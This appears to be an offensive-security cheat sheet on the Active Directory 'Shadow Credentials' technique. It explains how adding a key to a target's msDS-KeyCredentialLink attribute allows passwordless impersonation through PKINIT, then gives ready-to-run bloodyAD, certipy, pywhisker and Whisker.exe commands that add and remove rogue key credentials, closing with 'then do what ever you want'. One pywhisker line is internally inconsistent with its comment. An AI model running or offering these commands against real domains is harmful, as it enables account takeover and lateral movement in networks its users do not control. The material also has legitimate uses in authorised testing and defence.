 **Shadow Credentials** is an Active Directory persistence/privilege-escalation technique where an attacker **adds a valid key/certificate to a user or computer AD object** (the `msDS-KeyCredentialLink` attribute). Once that key is present the attacker can authenticate as the target via certificate/PKINIT (passwordless), get Kerberos tickets and move laterally — without needing the account password. [posts.specterops.io+1](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab?utm_source=chatgpt.com)
# How it works (conceptually)
- Windows (Windows Hello for Business / key-trust flows) stores public key credential entries on AD objects in the `msDS-KeyCredentialLink` attribute. Those entries let the object authenticate using the corresponding private key.
- If an attacker can **modify** that attribute (or otherwise append a key blob there) they can register a key they control for the victim account. The attacker then uses the private key to perform certificate-based Kerberos authentication (PKINIT) and obtain TGT/STs as the victim.

## Preconditions & attack surface
- The attacker needs **write control** over the target AD object (or an AD misconfiguration/DACL that allows appending to `msDS-KeyCredentialLink`). This often requires elevated AD permissions or a DACL/ACL weakness on the user/computer object.
- The environment must accept certificate/PKINIT authentication for the account (many do, especially when Windows Hello for Business or certificate authentication is in use).


### From linux
#### bloodyAD
```sh
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add shadowCredentials targetpc$
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove shadowCredentials targetpc$ --key <key from previous output>
```

#### certipy
```sh
certipy shadow auto -username "$USER"@"$DOMAIN" -password "$PASSWORD" -k -account "TargetAccount" -target "$DC"
```

#### pywhisker
```sh
# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
# Removes a key credential from the target object specified by a DeviceID GUID.
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
```

Now you got certificate, you can use it to get TGT then do what ever you want:
### From windows
```powershell
# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
Whisker.exe list /target:computername$
# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
# Removes a key credential from the target object specified by a DeviceID GUID.
Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
```